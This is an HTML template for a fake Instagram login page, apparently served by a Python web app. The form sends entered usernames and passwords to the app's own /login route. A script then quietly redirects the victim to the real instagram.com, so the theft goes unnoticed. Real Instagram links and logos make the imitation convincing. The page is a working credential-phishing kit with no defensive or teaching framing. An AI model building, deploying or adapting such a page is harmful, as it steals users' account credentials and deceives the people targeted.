<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="{{ url_for('static', path='css/styles.css') }}">
    <link rel="icon" type="image/png" href="favicon.png">
    <title>Instagram</title>
    <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="h-screen overflow-hidden flex items-center justify-center" style="background: white;">
    <div class="h-screen bg-gray-50 flex flex-col justify-center items-center">
        <div class="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
            <img src="{{ url_for('static', path='images/Instagram_logo.png') }}" class="instagram-logo">
            <form class="mt-8 w-64 flex flex-col" action="/login" method="post" onsubmit="redirectToInstagram()">
                <input autofocus
                    class="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
                    id="email" name="email" placeholder="Phone number, username, or email" type="text"> <!-- Added name attribute -->
                <div class="relative mb-4">
                <input
                    class="text-xs w-full rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
                    id="password" name="password" placeholder="Password" type="password"> <!-- Added name attribute -->
                <span class="show-password" id="showPassword" style="display: none;">Show</span>
                </div>
                <button type="submit" class="text-sm text-center bg-blue-300 text-white py-1 rounded font-medium">
                Log In
                </button>
            </form>
            <div class="flex justify-evenly space-x-2 w-64 mt-4">
                <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
                <span class="flex-none uppercase text-xs font-semibold or-txt">or</span>
                <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
            </div>
            <button class="mt-4 flex">
                <img src="{{ url_for('static', path='images/facebook.png') }}" class="facebook-logo">
                <span class="font-semibold facebook-txt ml-1">Log in with Facebook</span>
            </button>
            <a href="https://www.instagram.com/accounts/password/reset/" class="text-xs mt-4 cursor-pointer -mb-4 forgot-pass-txt">Forgot password?</a>
        </div>
        <div class="bg-white border border-gray-300 text-center w-80 py-4">
            <span class="text-sm">Don't have an account?</span>
            <a href="https://www.instagram.com/accounts/emailsignup/" class="text-blue-500 text-sm font-semibold signup-txt">Sign up</a>
        </div>
        <div class="mt-3 text-center">
            <span class="text-xs">Get the app.</span>
            <div class="flex mt-3 space-x-2">
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN" class="google-store-logo" target="_blank">
                    <img src="{{ url_for('static', path='images/badge_android_english-en.png') }}" alt="Button Image">
                </a>
                <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US" class="microsoft-store-logo" target="_blank">
                    <img src="{{ url_for('static', path='images/microsoft-store.png') }}" alt="Button Image">
                </a>
            </div>
        </div>
    </div>
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
    <script>
        const passwordField = document.getElementById("password");
        const showPasswordButton = document.getElementById("showPassword");

        // Show the "Show" button when there is input in the password field
        passwordField.addEventListener("input", function () {
            showPasswordButton.style.display = passwordField.value.length > 0 ? "inline" : "none"; // Show or hide button based on input
        });

        // Toggle password visibility when the "Show" button is clicked
        showPasswordButton.addEventListener("click", function () {
            const isPassword = passwordField.type === "password";
            passwordField.type = isPassword ? "text" : "password"; // Toggle input type
            showPasswordButton.textContent = isPassword ? "Hide" : "Show"; // Toggle button text
        });

        const emailInput = document.getElementById('email');
        emailInput.addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                passwordField.focus(); // Move focus to password field on Enter
            }
        });

        function redirectToInstagram() {
            // Redirect to Instagram after a short delay to allow form submission
            setTimeout(function() {
                window.location.href = "https://www.instagram.com/";
            }, 1000); // Adjust the delay as needed (1000 ms = 1 second)
        }
    </script>
</body>
</html>
